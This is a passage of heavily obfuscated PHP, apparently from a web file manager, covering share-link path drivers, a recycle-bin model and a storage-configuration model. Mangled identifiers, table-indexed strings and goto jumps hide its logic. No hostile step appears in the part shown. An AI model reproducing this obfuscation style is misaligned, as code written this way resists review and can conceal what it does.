$this->addEvent($Ø†óı, $Åé³“‚Õ[2085], $É÷‰ÛÉÄ); } public function eventCopy($İÅ‡îşú) { $this->eventCreate($İÅ‡îşú, $_SERVER[³·—™¤¢][555]); } public function eventRename($à ˆë¸ø, $¾“©•»Ç, $€Ç£©¿à) { $ªª®¤ =& $_SERVER[³·—™¤¢]; $Ë…‹úñù = array($ªª®¤[1183] => $¾“©•»Ç, $ªª®¤[1184] => $€Ç£©¿à); return $this->addEvent($à ˆë¸ø, $ªª®¤[1365], $Ë…‹úñù); } public function eventAddComment($§—Ä­íò, $Úğ´‚ŸÊ) { return $this->addEvent($§—Ä­íò, $_SERVER[³·—™¤¢][2086], $Úğ´‚ŸÊ); } public function eventAddDesc($òÔ²ûà÷, $Ù¬®éÁı) { return $this->addEvent($òÔ²ûà÷, $_SERVER[³·—™¤¢][2087], $Ù¬®éÁı); } public function listBySource($­›ïµêÒ) { $Ì‹á‡Ï‡ =& $_SERVER[³·—™¤¢]; $Ö™µãí = Model($Ì‹á‡Ï‡[1350])->sourceInfo($­›ïµêÒ); $¥¾ˆ™¤ = array($Ì‹á‡Ï‡[417] => $­›ïµêÒ); if ($Ö™µãí[$Ì‹á‡Ï‡[410]] == $Ì‹á‡Ï‡[88]) { $ë´ŸÂ³ = Model($Ì‹á‡Ï‡[1350])->listSearchChildren($­›ïµêÒ, 20000); $ë´ŸÂ³[] = $­›ïµêÒ . $Ì‹á‡Ï‡[378]; $¥¾ˆ™¤ = array($Ì‹á‡Ï‡[402] => array($Ì‹á‡Ï‡[7], $ë´ŸÂ³)); } $‡„¿âŞù = $this->where($¥¾ˆ™¤)->order($Ì‹á‡Ï‡[2088])->selectPage(); if ($‡„¿âŞù[$Ì‹á‡Ï‡[366]][$Ì‹á‡Ï‡[367]] == 0) { $‡„¿âŞù[$Ì‹á‡Ï‡[366]][$Ì‹á‡Ï‡[367]] = 1; $‡„¿âŞù[$Ì‹á‡Ï‡[369]] = array(array($Ì‹á‡Ï‡[417] => $­›ïµêÒ, $Ì‹á‡Ï‡[2069] => $Ö™µãí[$Ì‹á‡Ï‡[432]], $Ì‹á‡Ï‡[1671] => $Ö™µãí[$Ì‹á‡Ï‡[454]], $Ì‹á‡Ï‡[422] => $Ì‹á‡Ï‡[2089], $Ì‹á‡Ï‡[423] => $Ö™µãí[$Ì‹á‡Ï‡[200]], $Ì‹á‡Ï‡[1673] => $Ì‹á‡Ï‡[12])); } return $this->eventListParse($‡„¿âŞù, $­›ïµêÒ); } private function eventListParse($¶Ò§ñ , $³öáº) { $ ®³ğ¼Œ =& $_SERVER[³·—™¤¢]; $ñÒ²ë²Î = $¶Ò§ñ [$ ®³ğ¼Œ[369]]; $ÊÌÉä®ó = array_to_keyvalue($ñÒ²ë²Î, $ ®³ğ¼Œ[12], $ ®³ğ¼Œ[402]); $æ²§ë ‰ = array_to_keyvalue($ñÒ²ë²Î, $ ®³ğ¼Œ[12], $ ®³ğ¼Œ[2075]); foreach ($ñÒ²ë²Î as $¸˜„åÇÑ) { $Ëã€²Œ˜ = $¸˜„åÇÑ[$ ®³ğ¼Œ[453]]; if ($¸˜„åÇÑ[$ ®³ğ¼Œ[33]] == $ ®³ğ¼Œ[557] && isset($Ëã€²Œ˜[$ ®³ğ¼Œ[1183]])) { $ÊÌÉä®ó[] = $Ëã€²Œ˜[$ ®³ğ¼Œ[1183]] . $ ®³ğ¼Œ[12]; $ÊÌÉä®ó[] = $Ëã€²Œ˜[$ ®³ğ¼Œ[1184]] . $ ®³ğ¼Œ[12]; } if ($¸˜„åÇÑ[$ ®³ğ¼Œ[33]] == $ ®³ğ¼Œ[2085] && isset($Ëã€²Œ˜[$ ®³ğ¼Œ[402]])) { $ÊÌÉä®ó[] = $Ëã€²Œ˜[$ ®³ğ¼Œ[402]] . $ ®³ğ¼Œ[12]; } } $ÊÌÉä®ó = array_merge($ÊÌÉä®ó, $æ²§ë ‰, array($³öáº . $ ®³ğ¼Œ[12])); $ÊÌÉä®ó = array_unique($ÊÌÉä®ó); $øÒù™ÂŞ = array_unique(array_to_keyvalue($ñÒ²ë²Î, $ ®³ğ¼Œ[12], $ ®³ğ¼Œ[1680])); $ã€ÛœªÑ = Model($ ®³ğ¼Œ[535])->userListInfo($øÒù™ÂŞ); $™˜£¼™ = Model($ ®³ğ¼Œ[845])->sourceListInfo($ÊÌÉä®ó, !0); foreach ($ñÒ²ë²Î as &$¸˜„åÇÑ) { if ($¸˜„åÇÑ[$ ®³ğ¼Œ[33]] == $ ®³ğ¼Œ[557] && isset($¸˜„åÇÑ[$ ®³ğ¼Œ[453]][$ ®³ğ¼Œ[1183]])) { $¸˜„åÇÑ[$ ®³ğ¼Œ[453]][$ ®³ğ¼Œ[1183]] = $™˜£¼™[$¸˜„åÇÑ[$ ®³ğ¼Œ[453]][$ ®³ğ¼Œ[1183]]]; $¸˜„åÇÑ[$ ®³ğ¼Œ[453]][$ ®³ğ¼Œ[1184]] = $™˜£¼™[$¸˜„åÇÑ[$ ®³ğ¼Œ[453]][$ ®³ğ¼Œ[1184]]]; } if ($¸˜„åÇÑ[$ ®³ğ¼Œ[33]] == $ ®³ğ¼Œ[2085] && isset($¸˜„åÇÑ[$ ®³ğ¼Œ[453]][$ ®³ğ¼Œ[402]])) { $¸˜„åÇÑ[$ ®³ğ¼Œ[453]][$ ®³ğ¼Œ[402]] = $™˜£¼™[$¸˜„åÇÑ[$ ®³ğ¼Œ[453]][$ ®³ğ¼Œ[402]]]; } $¸˜„åÇÑ[$ ®³ğ¼Œ[86]] = $™˜£¼™[$¸˜„åÇÑ[$ ®³ğ¼Œ[402]]]; $¸˜„åÇÑ[$ ®³ğ¼Œ[2090]] = $™˜£¼™[$¸˜„åÇÑ[$ ®³ğ¼Œ[2075]]]; if ($¸˜„åÇÑ[$ ®³ğ¼Œ[33]] == $ ®³ğ¼Œ[1821]) { $¸˜„åÇÑ[$ ®³ğ¼Œ[2090]] = $¸˜„åÇÑ[$ ®³ğ¼Œ[86]]; $¸˜„åÇÑ[$ ®³ğ¼Œ[2075]] = $¸˜„åÇÑ[$ ®³ğ¼Œ[2090]][$ ®³ğ¼Œ[402]]; $¸˜„åÇÑ[$ ®³ğ¼Œ[86]] = !1; $¸˜„åÇÑ[$ ®³ğ¼Œ[402]] = $ ®³ğ¼Œ[12]; } $¸˜„åÇÑ[$ ®³ğ¼Œ[2020]] = $ã€ÛœªÑ[$¸˜„åÇÑ[$ ®³ğ¼Œ[1680]]]; } unset($¸˜„åÇÑ); $¶Ò§ñ [$ ®³ğ¼Œ[369]] = $ñÒ²ë²Î; return $¶Ò§ñ ; } public function removeBySource($·Áğ±Ä) { $”ÃÔŞ¦Ô = array($_SERVER[³·—™¤¢][417] => $·Áğ±Ä); $this->where($”ÃÔŞ¦Ô)->remove(); } } goto CÏŞòó¨â¤; A£¬Õ¤õ: define($_SERVER[³·—™¤¢][238], 1); define($_SERVER[³·—™¤¢][239], 2); define($_SERVER[³·—™¤¢][240], 3); goto CÀŸéùãÂ; aÑŒ…¨„“: class PathDriverDriverShareItem { public function __construct($µÏØ±·) { $this->pathParse = $µÏØ±·; } public function __call($ĞÍıàêå, $‘Ìú¯›Ì) { $™·ê†À =& $_SERVER[³·—™¤¢]; if (method_exists($this, $ĞÍıàêå)) { return; } $”ÊŠ–€“ = call_user_func_array(array($™·ê†À[1360], $ĞÍıàêå), $‘Ìú¯›Ì); $ü˜’Ê®« = array($™·ê†À[1361], $™·ê†À[1362], $™·ê†À[1363], $™·ê†À[1364], $™·ê†À[555], $™·ê†À[557], $™·ê†À[1365], $™·ê†À[107], $™·ê†À[1366], $™·ê†À[1367]); if (in_array($ĞÍıàêå, $ü˜’Ê®«)) { $”ÊŠ–€“ = $this->getPathOuter($”ÊŠ–€“); } return $”ÊŠ–€“; } public function copy($’’Ü‡¤ç, $Ç¿õ€Ğô, $‚Ã´™•Ó = false, $¹–£èµ = false) { return $this->copyMove($’’Ü‡¤ç, $Ç¿õ€Ğô, $‚Ã´™•Ó, $_SERVER[³·—™¤¢][555], $¹–£èµ); } public function move($±˜´Íñª, $›áÓ›‰«, $Å±ø = false, $ŠÄ–¼õ = false) { return $this->copyMove($±˜´Íñª, $›áÓ›‰«, $Å±ø, $_SERVER[³·—™¤¢][557], $ŠÄ–¼õ); } private function copyMove($Ú˜Æì¨, $‘ŸÍÕ¯Ç, $­§†Óšô, $î¦ÜÇÜñ, $Ò×¸†§Ó = false) { $¥‡Ğºı =& $_SERVER[³·—™¤¢]; $£şıĞ±˜ = $‘ŸÍÕ¯Ç; $È½ôÜÄ = IO::driverMake($‘ŸÍÕ¯Ç); if ($È½ôÜÄ->pathParse[$¥‡Ğºı[1174]]) { $‘ŸÍÕ¯Ç = $È½ôÜÄ->pathParse[$¥‡Ğºı[1174]]; } else { $‘ŸÍÕ¯Ç = $£şıĞ±˜; } $¿¾è®Á = IO::copyMove($Ú˜Æì¨, $‘ŸÍÕ¯Ç, $­§†Óšô, $î¦ÜÇÜñ, $Ò×¸†§Ó); $¿¾è®Á = $this->getPathOuter($¿¾è®Á); return $¿¾è®Á; } public function pathThis($¡«ûÀõÏ) { return get_path_this($this->pathParse[$_SERVER[³·—™¤¢][84]]); } public function pathFather($Ù€ôòãØ) { return get_path_father($this->pathParse[$_SERVER[³·—™¤¢][84]]); } public function iconvSystem($«ê¦®á¶) { return $«ê¦®á¶; } protected function infoParse($Ğ¨Êã¬Ò, $ò‚Ù¶ßÅ = false) { $µ¾‹³ÔŞ =& $_SERVER[³·—™¤¢]; $ıù…”£ = $this->pathParse[$µ¾‹³ÔŞ[487]][$µ¾‹³ÔŞ[1199]] . $this->pathParse[$µ¾‹³ÔŞ[1192]]; if ($ò‚Ù¶ßÅ) { $¯ˆ×´Î¦ = IO::infoWithChildren($ıù…”£); } else { $¯ˆ×´Î¦ = IO::info($ıù…”£); } $ÇÓ¿¸øÏ = $this->pathParse[$µ¾‹³ÔŞ[487]]; return Action($µ¾‹³ÔŞ[1358])->_shareItemeParse($¯ˆ×´Î¦, $ÇÓ¿¸øÏ); } public function listAll($òÁŞœÍÉ) { $Âù÷™†“ =& $_SERVER[³·—™¤¢]; $şÏÀ€øÅ = IO::listAll($òÁŞœÍÉ); $§¼ƒßÖ€ = $this->pathParse[$Âù÷™†“[487]]; foreach ($şÏÀ€øÅ as &$İ‡®Š©û) { check_abort(); $°²»Çµ = IO::info($İ‡®Š©û[$Âù÷™†“[84]]); $°²»Çµ = is_array($°²»Çµ) ? $°²»Çµ : array(); $İ‡®Š©û = array_merge($°²»Çµ, $İ‡®Š©û); $İ‡®Š©û[$Âù÷™†“[86]] = Action($Âù÷™†“[1358])->_shareItemeParse($İ‡®Š©û, $§¼ƒßÖ€); } unset($İ‡®Š©û); return $şÏÀ€øÅ; } public function getPathOuter($âÊ¼é“ş) { $ãèô¼å„ =& $_SERVER[³·—™¤¢]; $ÉÃ‡±Ö— = KodIO::parse($âÊ¼é“ş); if ($ÉÃ‡±Ö—[$ãèô¼å„[33]] == KodIO::KOD_SHARE_ITEM) { return $ÉÃ‡±Ö—[$ãèô¼å„[84]]; } $Ñ»” = KodIO::clear($âÊ¼é“ş); $âû“ñÆ = KodIO::clear($this->pathParse[$ãèô¼å„[487]][$ãèô¼å„[1199]]); $ˆØğ™Ü = substr($Ñ»”, strlen($âû“ñÆ)); if (substr($Ñ»”, 0, strlen($âû“ñÆ)) != $âû“ñÆ) { return !1; } return $this->pathParse[$ãèô¼å„[1193]] . $ãèô¼å„[8] . ltrim($ˆØğ™Ü, $ãèô¼å„[8]); } public function getType() { $àş¡Ôï… =& $_SERVER[³·—™¤¢]; $ŒÆ‹¼ôà = str_replace($àş¡Ôï…[74], $àş¡Ôï…[12], get_class($this)); return strtolower($ŒÆ‹¼ôà); } public function isTypeObject($„ÍïàŞƒ) { return IO::isTypeObject($„ÍïàŞƒ); } public function info($–ãğààá) { return $this->infoParse($–ãğààá); } public function infoAuth($Îåœ•°Õ) { return $this->infoParse($Îåœ•°Õ); } public function infoWithChildren($¤¬ÏÌıİ) { return $this->infoParse($¤¬ÏÌıİ, !0); } public function infoFull($ÀŞºˆ¢) { return $this->infoParse($ÀŞºˆ¢); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($¤õÅ°³‡) { $this->pathParse = $¤õÅ°³‡; } protected function infoParse($¼’´ˆà, $šæ™×®ñ = false) { $º‚Êçê‹ =& $_SERVER[³·—™¤¢]; return Action($º‚Êçê‹[1198])->sharePathInfo($this->pathParse[$º‚Êçê‹[84]], !0, $šæ™×®ñ); } public function listPath($Û”÷Š”æ, $”ßÄßè¨ = false) { $â„¬¿Ï’ =& $_SERVER[³·—™¤¢]; $³üòÚçÇ = IO::listPath($Û”÷Š”æ, $”ßÄßè¨); if (!$³üòÚçÇ) { return $³üòÚçÇ; } if (is_array($³üòÚçÇ[$â„¬¿Ï’[1359]])) { $’¢´¤Ò¼ = Action($â„¬¿Ï’[1368])->parsePathChildren($³üòÚçÇ[$â„¬¿Ï’[1359]], array($â„¬¿Ï’[421] => $Û”÷Š”æ)); $³üòÚçÇ[$â„¬¿Ï’[1359]] = Action($â„¬¿Ï’[1198])->shareItemInfo($’¢´¤Ò¼); } foreach ($³üòÚçÇ as $âŸ€À¾› => $×ö®á–¥) { if (!in_array($âŸ€À¾›, array($â„¬¿Ï’[83], $â„¬¿Ï’[82]))) { continue; } foreach ($×ö®á–¥ as $®•åŸÇ« => $’¢´¤Ò¼) { $’¢´¤Ò¼ = Action($â„¬¿Ï’[1368])->parsePathChildren($’¢´¤Ò¼, array($â„¬¿Ï’[421] => $Û”÷Š”æ)); $³üòÚçÇ[$âŸ€À¾›][$®•åŸÇ«] = Action($â„¬¿Ï’[1198])->shareItemInfo($’¢´¤Ò¼); } } return $³üòÚçÇ; } public function listAll($ƒÎºÌòö) { $£½İ¤æ„ =& $_SERVER[³·—™¤¢]; $³şïÙßŠ = IO::listAll($ƒÎºÌòö); foreach ($³şïÙßŠ as &$Áô¾òãè) { $…ÖşÆ³ = IO::info($Áô¾òãè[$£½İ¤æ„[84]]); $…ÖşÆ³ = is_array($…ÖşÆ³) ? $…ÖşÆ³ : array(); $Áô¾òãè = array_merge($…ÖşÆ³, $Áô¾òãè); $Áô¾òãè[$£½İ¤æ„[86]] = Action($£½İ¤æ„[1198])->shareItemInfo($Áô¾òãè); } unset($Áô¾òãè); return $³şïÙßŠ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($çó¡ıó‰) { parent::__construct($çó¡ıó‰); } } goto Cï¹ë•ËÀ; E—š‘Æäœ: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\x72\143\x65\x5f\x72\x65\143\x79\x63\154\145"; protected $dataAuto = array(array("\143\162\x65\141\164\145\124\x69\155\145", "\164\151\155\x65", "\x69\x6e\163\145\x72\x74", "\146\x75\x6e\x63\x74\x69\157\156")); public function listData($˜›óÇŠ« = false) { $®ä×äÖ÷ =& $_SERVER[³·—™¤¢]; $˜›óÇŠ« = $˜›óÇŠ« ? $˜›óÇŠ« : USER_ID; $ÃŒ‹âö = $this->where(array($®ä×äÖ÷[1671] => $˜›óÇŠ«))->select(); return array_to_keyvalue($ÃŒ‹âö, $®ä×äÖ÷[12], $®ä×äÖ÷[402]); } public function moveToRecycle($äâĞ›Ëù) { $éõÌÅìú =& $_SERVER[³·—™¤¢]; $á•Í¥Ÿ = Model($éõÌÅìú[1350]); $”ˆ˜’ùÏ = $á•Í¥Ÿ->sourceInfo($äâĞ›Ëù); if (!$”ˆ˜’ùÏ || $”ˆ˜’ùÏ[$éõÌÅìú[431]] == $éõÌÅìú[88]) { return; } $œ÷š¾î¨ = array($éõÌÅìú[417] => $äâĞ›Ëù, $éõÌÅìú[1671] => USER_ID, $éõÌÅìú[586] => $”ˆ˜’ùÏ[$éõÌÅìú[411]], $éõÌÅìú[587] => $”ˆ˜’ùÏ[$éõÌÅìú[505]], $éõÌÅìú[590] => $”ˆ˜’ùÏ[$éõÌÅìú[521]]); $this->add($œ÷š¾î¨); $this->recycleMove($äâĞ›Ëù, 1); if ($”ˆ˜’ùÏ[$éõÌÅìú[410]] == $éõÌÅìú[88]) { $‰ÅÁéí£ = array($éõÌÅìú[590] => array($éõÌÅìú[550], $”ˆ˜’ùÏ[$éõÌÅìú[521]] . $äâĞ›Ëù . $éõÌÅìú[551])); $á•Í¥Ÿ->where($‰ÅÁéí£)->setField($éõÌÅìú[431], 1); } } public function clear() { $this->remove(!1); } public function remove($«¦§è¤á = false, $º§Äıñ¬ = false) { $šŞğ¥“ =& $_SERVER[³·—™¤¢]; $º§Äıñ¬ = $º§Äıñ¬ ? $º§Äıñ¬ : USER_ID; $¨Œ£ŞµÆ = Model($šŞğ¥“[1350]); $¦ãñ˜Ìù = $this->listData($º§Äıñ¬); $«¦§è¤á = $«¦§è¤á === !1 ? !1 : $«¦§è¤á; $ÎÅ… Ú = array(); foreach ($¦ãñ˜Ìù as $Ââ®Ù«è) { if ($«¦§è¤á != !1 && !in_array($Ââ®Ù«è, $«¦§è¤á)) { continue; } $æêèŞÃ˜ = $¨Œ£ŞµÆ->sourceInfo($Ââ®Ù«è); $¨Œ£ŞµÆ->remove($Ââ®Ù«è, !1); $õù¦§Ú = $æêèŞÃ˜[$šŞğ¥“[411]] . $šŞğ¥“[11] . $æêèŞÃ˜[$šŞğ¥“[505]]; $ÎÅ… Ú[$õù¦§Ú] = array($šŞğ¥“[586] => $æêèŞÃ˜[$šŞğ¥“[411]], $šŞğ¥“[505] => $æêèŞÃ˜[$šŞğ¥“[505]]); $this->where(array($šŞğ¥“[402] => $Ââ®Ù«è))->delete(); } foreach ($ÎÅ… Ú as $€”û•—Ë) { $¨Œ£ŞµÆ->targetSpaceUpdate($€”û•—Ë[$šŞğ¥“[411]], $€”û•—Ë[$šŞğ¥“[505]]); } } public function restore($îˆ˜…— = false) { $â¹É‘Ğ = $this->listData(); $this->_restoreSource($â¹É‘Ğ, $îˆ˜…—); } public function removeUserAll($âÛ…¶Õ´) { $this->remove(!1, $âÛ…¶Õ´); } private function _restoreSource($ûéûõ×Ï, $¶•àµÎ¢) { $ŠèˆÂäÜ =& $_SERVER[³·—™¤¢]; $ã¨ØÅû˜ = Model($ŠèˆÂäÜ[1350]); $¶•àµÎ¢ = $¶•àµÎ¢ == !1 ? !1 : $¶•àµÎ¢; if (!$ûéûõ×Ï) { return !0; } $§¥ÓùÙæ = array(); foreach ($ûéûõ×Ï as $­¶»¶) { if ($¶•àµÎ¢ != !1 && !in_array($­¶»¶, $¶•àµÎ¢)) { continue; } $äòºõ„¨ = $ã¨ØÅû˜->sourceInfo($­¶»¶); $„Ñ»÷•© = $ã¨ØÅû˜->sourceInfo($äòºõ„¨[$ŠèˆÂäÜ[432]]); if ($„Ñ»÷•©[$ŠèˆÂäÜ[431]] == $ŠèˆÂäÜ[88]) { continue; } $ã¨ØÅû˜->lockMoveStart($­¶»¶); $this->recycleMove($­¶»¶, 0); if ($äòºõ„¨[$ŠèˆÂäÜ[410]] == $ŠèˆÂäÜ[88]) { $ó€°ÍÄƒ = array($ŠèˆÂäÜ[590] => array($ŠèˆÂäÜ[550], $äòºõ„¨[$ŠèˆÂäÜ[521]] . $­¶»¶ . $ŠèˆÂäÜ[551])); $ã¨ØÅû˜->where($ó€°ÍÄƒ)->setField($ŠèˆÂäÜ[431], 0); $this->restoreFolderChildren($­¶»¶, $ûéûõ×Ï); } $this->where(array($ŠèˆÂäÜ[402] => $­¶»¶))->delete(); $ã¨ØÅû˜->folderSizeReset($äòºõ„¨[$ŠèˆÂäÜ[432]]); $§¥ÓùÙæ[] = $äòºõ„¨[$ŠèˆÂäÜ[432]]; if ($äòºõ„¨[$ŠèˆÂäÜ[410]] == $ŠèˆÂäÜ[88]) { $§¥ÓùÙæ[] = $­¶»¶; } $ã¨ØÅû˜->lockMoveEnd($­¶»¶); } $ã¨ØÅû˜->updateModifyTime($§¥ÓùÙæ); } private function restoreFolderChildren($ËöÏúúÅ, $¢“²úú) { $Ó‚àÎì =& $_SERVER[³·—™¤¢]; $Ñæµº¨ = Model($Ó‚àÎì[1350]); $„ûŞÎì” = array($Ó‚àÎì[402] => array($Ó‚àÎì[7], array())); foreach ($¢“²úú as $œĞ™­è) { if ($œĞ™­è == $ËöÏúúÅ) { continue; } if (!$Ñæµº¨->isParentOf($ËöÏúúÅ, $œĞ™­è)) { continue; } $¼ùÔ…¡¸ = $Ñæµº¨->sourceInfo($œĞ™­è); if ($¼ùÔ…¡¸[$Ó‚àÎì[410]] == $Ó‚àÎì[88]) { $„ûŞÎì”[] = array($Ó‚àÎì[590] => array($Ó‚àÎì[550], $¼ùÔ…¡¸[$Ó‚àÎì[521]] . $œĞ™­è . $Ó‚àÎì[551])); } else { $„ûŞÎì”[$Ó‚àÎì[402]][1][] = $œĞ™­è; } } if (!$„ûŞÎì”[$Ó‚àÎì[402]][1]) { unset($„ûŞÎì”[$Ó‚àÎì[402]]); } if (!$„ûŞÎì”) { return; } $„ûŞÎì”[$Ó‚àÎì[402]][1] = array_unique($„ûŞÎì”[$Ó‚àÎì[402]][1]); $„ûŞÎì”[$Ó‚àÎì[1023]] = $Ó‚àÎì[1950]; $Ñæµº¨->where($„ûŞÎì”)->setField($Ó‚àÎì[431], 1); } private function recycleMove($´»ˆ¥£, $Ä˜†ÕÅ´ = 1) { $Æğ¦ìİÁ =& $_SERVER[³·—™¤¢]; $–¤¡ˆÜ = Model($Æğ¦ìİÁ[1350]); $ØÍÅ¹Æœ = Model($Æğ¦ìİÁ[2161]); $óæëí¶£ = array($Æğ¦ìİÁ[402] => $´»ˆ¥£); if ($Ä˜†ÕÅ´) { $–¤¡ˆÜ->where($óæëí¶£)->setField($Æğ¦ìİÁ[431], 1); $ØÍÅ¹Æœ->eventRecycle($´»ˆ¥£, $Æğ¦ìİÁ[2162]); } else { $ì–²­ò« = $–¤¡ˆÜ->where($óæëí¶£)->find(); $ÁßøƒÒ‰ = $ì–²­ò«[$Æğ¦ìİÁ[410]] == $Æğ¦ìİÁ[88]; $¨Êœ÷¤ = $–¤¡ˆÜ->fileNameAuto($ì–²­ò«[$Æğ¦ìİÁ[432]], $ì–²­ò«[$Æğ¦ìİÁ[32]], REPEAT_RENAME_FOLDER, $ÁßøƒÒ‰); if ($¨Êœ÷¤ != $ì–²­ò«[$Æğ¦ìİÁ[32]]) { $–¤¡ˆÜ->rename($´»ˆ¥£, $¨Êœ÷¤); } $–¤¡ˆÜ->where($óæëí¶£)->setField($Æğ¦ìİÁ[431], 0); $ØÍÅ¹Æœ->eventRecycle($´»ˆ¥£, $Æğ¦ìİÁ[2163]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\56\163\x6f\x75\x72\143\145\x53\145\x63\x72\x65\164\x4c\151\163\x74"; public $field = array("\163\157\x75\x72\143\x65\x49\x44", "\x74\171\x70\x65\111\x44", "\x63\x72\145\141\164\x65\x55\x73\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\56\163\164\157\162\x61\147\x65\x4c\x69\163\x74"; public $field = array("\156\x61\x6d\x65", "\x73\151\x7a\x65\115\141\170", "\x73\171\x73\x74\x65\155", "\144\145\x66\x61\165\x6c\x74", "\144\x72\x69\x76\145\162", "\143\x6f\156\x66\x69\x67"); public function listData($ĞÈ‚ş = false, $¸¢ù˜Òé = "\155\157\144\151\146\171\x54\151\155\145", $ô‰…¬â« = false) { $ú¡¼ò”™ =& $_SERVER[³·—™¤¢]; $ª‚¿†Îœ = parent::listData($ĞÈ‚ş, $¸¢ù˜Òé, $ô‰…¬â«); if ($ĞÈ‚ş) { return $ª‚¿†Îœ; } $ı´ıÂá• = $this->ioSizeUseGet(array_to_keyvalue($ª‚¿†Îœ, $ú¡¼ò”™[12], $ú¡¼ò”™[399])); foreach ($ª‚¿†Îœ as $ˆÚÈ¤¼‘ => $¸ÎŸÔ‹) { unset($ª‚¿†Îœ[$ˆÚÈ¤¼‘][$ú¡¼ò”™[6]]); $ª‚¿†Îœ[$ˆÚÈ¤¼‘][$ú¡¼ò”™[1841]] = isset($ı´ıÂá•[$¸ÎŸÔ‹[$ú¡¼ò”™[399]]]) ? $ı´ıÂá•[$¸ÎŸÔ‹[$ú¡¼ò”™[399]]] : 0; } return $ª‚¿†Îœ; } public function ioSizeUseGet($°™ÏÄãÇ) { $¼ÇÁ­ƒÁ =& $_SERVER[³·—™¤¢]; if (!$°™ÏÄãÇ) { return array(); } $ª½øúÈ = $¼ÇÁ­ƒÁ[2164] . implode($¼ÇÁ­ƒÁ[50], $°™ÏÄãÇ); $ğÓ£šó = Cache::get($ª½øúÈ); if ($ğÓ£šó) { return $ğÓ£šó; } $Ğ¢ı€Û = array($¼ÇÁ­ƒÁ[837] => $¼ÇÁ­ƒÁ[399], $¼ÇÁ­ƒÁ[2165] => $¼ÇÁ­ƒÁ[76]); $‚öıëÌ = array($¼ÇÁ­ƒÁ[837] => array($¼ÇÁ­ƒÁ[7], $°™ÏÄãÇ)); $ğÓ£šó = Model($¼ÇÁ­ƒÁ[809])->field($Ğ¢ı€Û)->where($‚öıëÌ)->group($¼ÇÁ­ƒÁ[837])->select(); $ğÓ£šó = array_to_keyvalue($ğÓ£šó, $¼ÇÁ­ƒÁ[399], $¼ÇÁ­ƒÁ[76]); Cache::set($ª½øúÈ, $ğÓ£šó, 600); return $ğÓ£šó; } public function getConfig($ÈÚ‹ê••) { $›ó€Ëï® = parent::listData($ÈÚ‹ê••); return json_decode($›ó€Ëï®[$_SERVER[³·—™¤¢][6]], !0); } public function update($Ş ğ‡©, $„úáì«) { $ÈÕÄÇı™ =& $_SERVER[³·—™¤¢]; $½¦à®”¾ = $„úáì«[$ÈÕÄÇı™[32]]; $ñ´¥µı¤ = array_to_keyvalue(parent::listData(), $ÈÕÄÇı™[32]); if (isset($ñ´¥µı¤[$½¦à®”¾]) && $ñ´¥µı¤[$½¦à®”¾][$ÈÕÄÇı™[399]] != $Ş ğ‡©) { return !1; } if (!empty($„úáì«[$ÈÕÄÇı™[6]])) { $·±Ÿ’û = json_decode($„úáì«[$ÈÕÄÇı™[6]], !0); $ÕÄìçŞ” = isset($·±Ÿ’û[$ÈÕÄÇı™[2166]]) ? $ÈÕÄÇı™[2166] : (isset($·±Ÿ’û[$ÈÕÄÇı™[2167]]) ? $ÈÕÄÇı™[2167] : $ÈÕÄÇı™[12]); if ($ÕÄìçŞ”) { $¹á·˜ë = $this->getConfig($Ş ğ‡©); $÷¥é®’Û = $¹á·˜ë[$ÕÄìçŞ”]; $òæñı— = $·±Ÿ’û[$ÕÄìçŞ”]; if ($òæñı— == str_repeat($ÈÕÄÇı™[188], strlen($÷¥é®’Û))) { $·±Ÿ’û[$ÕÄìçŞ”] = $÷¥é®’Û; } else { if ($òæñı— != $÷¥é®’Û) { $„úáì«[$ÈÕÄÇı™[2168]] = $ÈÕÄÇı™[88]; } } } } if (isset($„úáì«[$ÈÕÄÇı™[2168]]) && $„úáì«[$ÈÕÄÇı™[2168]] == $ÈÕÄÇı™[88]) { $this->checkConfig($„úáì«); } unset($„úáì«[$ÈÕÄÇı™[2168]]); $ì¿›®ŸĞ = parent::update($Ş ğ‡©, $„úáì«); if ($ì¿›®ŸĞ && $„úáì«[$ÈÕÄÇı™[37]]) { $ªÆıì·ò = 0; foreach ($ñ´¥µı¤ as $Öâ¾ŞÀ¿) { if ($Öâ¾ŞÀ¿[$ÈÕÄÇı™[37]] && $Öâ¾ŞÀ¿[$ÈÕÄÇı™[399]] != $Ş ğ‡©) { $ªÆıì·ò = $Öâ¾ŞÀ¿[$ÈÕÄÇı™[399]]; parent::update($Öâ¾ŞÀ¿[$ÈÕÄÇı™[399]], array($ÈÕÄÇı™[37] => 0)); } } $this->updateBackup($Ş ğ‡©, $ªÆıì·ò); } return $ì¿›®ŸĞ; } public function add($ÆôÜ‡¯Ò) { $Œ©‘ö =& $_SERVER[³·—™¤¢]; $Û”­àøİ = array_to_keyvalue(parent::listData(), $Œ©‘ö[32]); if (isset($Û”­àøİ[$ÆôÜ‡¯Ò[$Œ©‘ö[32]]])) { return !1; } $this->checkConfig($ÆôÜ‡¯Ò); $æÍ«êéÏ = parent::insert($ÆôÜ‡¯Ò); if ($æÍ«êéÏ && $ÆôÜ‡¯Ò[$Œ©‘ö[37]]) { foreach ($Û”­àøİ as $æˆß¬ë™) { if ($æˆß¬ë™[$Œ©‘ö[37]]) { parent::update($æˆß¬ë™[$Œ©‘ö[399]], array($Œ©‘ö[37] => 0)); } } } return $æÍ«êéÏ; } public function updateBackup($ÂÌš¥ìá, $˜õê¾™) { $ÃŞ¤ïòÄ =& $_SERVER[³·—™¤¢]; if (!$˜õê¾™) { return; } $õ´å¨´ = Model($ÃŞ¤ïòÄ[769])->config(); if ($õ´å¨´[$ÃŞ¤ïòÄ[1650]] != $ÃŞ¤ïòÄ[88] || $õ´å¨´[$ÃŞ¤ïòÄ[772]] != $˜õê¾™) { return; } $íœôìÜÖ = Model($ÃŞ¤ïòÄ[790])->get($ÃŞ¤ïòÄ[800]); $íœôìÜÖ = json_decode($íœôìÜÖ, !0); if (!$íœôìÜÖ) { return; } $íœôìÜÖ[$ÃŞ¤ïòÄ[772]] = $ÂÌš¥ìá; Model($ÃŞ¤ïòÄ[790])->set(array($ÃŞ¤ïòÄ[800] => $íœôìÜÖ)); } public function checkConfig(&$ü¼ÃÏíæ, $Ù¹…„Ò = false) { $ˆòª¨Äˆ =& $_SERVER[³·—™¤¢]; $ĞÔÉğÜ¿ = strtolower($ü¼ÃÏíæ[$ˆòª¨Äˆ[95]]); 